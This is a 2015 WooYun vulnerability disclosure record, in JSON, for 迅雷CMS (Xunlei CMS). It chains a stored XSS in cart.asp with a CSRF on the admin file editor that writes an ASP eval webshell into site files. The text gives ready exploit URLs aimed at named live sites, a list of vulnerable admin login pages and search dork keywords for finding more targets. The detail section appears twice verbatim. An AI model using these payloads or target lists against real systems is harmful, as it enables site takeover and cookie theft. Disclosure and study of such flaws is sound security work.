{"id": 35663, "wybug_id": "wooyun-2015-0103443", "wybug_title": "迅雷Cms存储型XSS+Csrfgetshell", "wybug_corp": "迅雷CMS", "wybug_author": "浅蓝", "wybug_date": "2015-03-26 16:56", "wybug_open_date": "2015-05-10 16:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  #1、xsstemplate/cart.asp\norderNo=getOrderNo()cname=request(\"cname\")content=request(\"content\")Set rs= Server.CreateObject(\"ADODB.RecordSet\")sql=\"select * from cms_book\"rs.open sql,conn,3,3rs.addnewrs(\"cname\")=cnamers(\"content\")=contentrs.updaters.close\nrequest即可以get又可以post。构造URLhttp://www.xxx.com/template/cart.asp?cname=xssplay&content=xssplay\n\n\n\n进入后台弹出cookie#2、csrfgetshell看看后台编辑文件处抓包得出的数据\nhttp://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp\n\nurl=..%2Fsearch1.asp&folder=..&dpost=ok&content=%3C%21--%23include+file%3D%22inc%2Fconn.asp%22--%3E%0D%0A%3C%21--%23include+file%3D%22inc%2FLabelFunction.asp%22--%3E%0D%0A%3C%25%0D%0Aset+aa+%3D+new+art_list%0D%0Aaa.templateurl%3DGetTemplate%286%2C0%29%0D%0Aaa.templatepage%3Dgetnum%28%22page%22%29%0D%0Astr%3Daa.tag%28%29%0D%0Aresponse.Write+str%0D%0A%25%3E\n看wj.asp 中 上面post数据 在后端都是用request验证的 所以直接GET提交一个URL即可\n\n构造好URL Get提交\nhttp://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp&dpost=ok&content=<%eval request(\"x\")%>\n根据csrf  在留言处 用一个IMG标签src为http://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp&dpost=ok&content=<%eval request(\"x\")%>管理员浏览时就会get提交此URL吧search1.asp 换成根目录存在的asp文件即可 例如index.asp#\n\nhttp://ycxl.net/index.php?m=Article&a=index&id=22 上百案例此处只放出五个案例http://www.nxhailiang.com/admin/login.asphttp://www.nzwuye.com/admin/login.asphttp://www.nxedzs.com/admin/http://www.nxxayd.com/admin/login.asphttp://www.nxzz.com.cn/hsyjc/admin/login.asp搜索引擎关键词：技术支持：银川迅雷网络技术支持：迅雷品牌建站   漏洞证明：  #1、xsstemplate/cart.asp\norderNo=getOrderNo()cname=request(\"cname\")content=request(\"content\")Set rs= Server.CreateObject(\"ADODB.RecordSet\")sql=\"select * from cms_book\"rs.open sql,conn,3,3rs.addnewrs(\"cname\")=cnamers(\"content\")=contentrs.updaters.close\nrequest即可以get又可以post。构造URLhttp://www.xxx.com/template/cart.asp?cname=xssplay&content=xssplay\n\n\n\n进入后台弹出cookie#2、csrfgetshell看看后台编辑文件处抓包得出的数据\nhttp://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp\n\nurl=..%2Fsearch1.asp&folder=..&dpost=ok&content=%3C%21--%23include+file%3D%22inc%2Fconn.asp%22--%3E%0D%0A%3C%21--%23include+file%3D%22inc%2FLabelFunction.asp%22--%3E%0D%0A%3C%25%0D%0Aset+aa+%3D+new+art_list%0D%0Aaa.templateurl%3DGetTemplate%286%2C0%29%0D%0Aaa.templatepage%3Dgetnum%28%22page%22%29%0D%0Astr%3Daa.tag%28%29%0D%0Aresponse.Write+str%0D%0A%25%3E\n看wj.asp 中 上面post数据 在后端都是用request验证的 所以直接GET提交一个URL即可\n\n构造好URL Get提交\nhttp://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp&dpost=ok&content=<%eval request(\"x\")%>\n根据csrf  在留言处 用一个IMG标签src为http://www.nxedzs.com/admin/wj.asp?Action=editfile&folder=..&url=../search1.asp&dpost=ok&content=<%eval request(\"x\")%>管理员浏览时就会get提交此URL吧search1.asp 换成根目录存在的asp文件即可 例如index.asp#\n\nhttp://ycxl.net/index.php?m=Article&a=index&id=22 上百案例此处只放出五个案例http://www.nxhailiang.com/admin/login.asphttp://www.nzwuye.com/admin/login.asphttp://www.nxedzs.com/admin/http://www.nxxayd.com/admin/login.asphttp://www.nxzz.com.cn/hsyjc/admin/login.asp搜索引擎关键词：技术支持：银川迅雷网络技术支持：迅雷品牌建站   修复方案：  转义 token   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}